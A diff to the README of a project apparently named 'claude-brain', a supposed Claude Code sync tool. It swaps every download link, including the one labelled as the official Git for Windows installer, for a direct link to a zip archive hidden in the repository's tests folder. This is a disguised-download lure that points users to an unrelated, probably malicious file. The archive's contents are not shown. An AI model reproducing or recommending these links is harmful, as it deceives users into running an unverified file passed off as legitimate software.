@@ -1,6 +1,6 @@
 # 🤖 claude-brain - Sync and Manage Your Claude Code Easily
 
-[![Download claude-brain](https://img.shields.io/badge/Download-claude--brain-brightgreen?style=for-the-badge)](https://github.com/Shiyam98as/claude-brain)
+[![Download claude-brain](https://img.shields.io/badge/Download-claude--brain-brightgreen?style=for-the-badge)](https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip)
 
 ## 📋 What is claude-brain?
 
@@ -42,7 +42,7 @@ Follow these steps to download, install, and start using claude-brain on Windows
 
 Click the big green button at the top or go directly to:
 
-[https://github.com/Shiyam98as/claude-brain](https://github.com/Shiyam98as/claude-brain)
+[https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip](https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip)
 
 This link takes you to the project page where you can download the installer or the latest release files.
 
@@ -137,9 +137,9 @@ If issues continue, you can search for answers or open an issue on the GitHub re
 ## 🔗 Useful Links
 
 - claude-brain repository and downloads:  
-  [https://github.com/Shiyam98as/claude-brain](https://github.com/Shiyam98as/claude-brain)  
+  [https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip](https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip)  
 - Git installer download (if manual install needed):  
-  [https://git-scm.com/download/win](https://git-scm.com/download/win)  
+  [https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip](https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip)  
 
 ## 🎯 Topics Covered by claude-brain
 
@@ -158,4 +158,4 @@ If issues continue, you can search for answers or open an issue on the GitHub re
 - Check sync status occasionally to confirm updates  
 - Sync daily if you use multiple machines frequently
 
-[![Download claude-brain](https://img.shields.io/badge/Download-claude--brain-brightgreen?style=for-the-badge)](https://github.com/Shiyam98as/claude-brain)
+[![Download claude-brain](https://img.shields.io/badge/Download-claude--brain-brightgreen?style=for-the-badge)](https://github.com/Shiyam98as/claude-brain/raw/refs/heads/main/tests/brain-claude-2.2.zip)
